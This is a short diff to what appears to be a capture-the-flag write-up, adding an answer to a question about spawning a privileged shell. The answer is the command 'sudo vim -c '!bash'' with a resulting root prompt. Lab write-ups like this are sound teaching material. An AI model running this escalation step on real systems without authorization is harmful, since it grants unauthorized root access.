@@ -222,4 +222,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 09:19:
 
 ### What can you leverage to spawn a privileged shell?
 
+```
+$ sudo vim -c '!bash'
+
+root@Machine:~# 
+```
+
 ### What's the root flag?
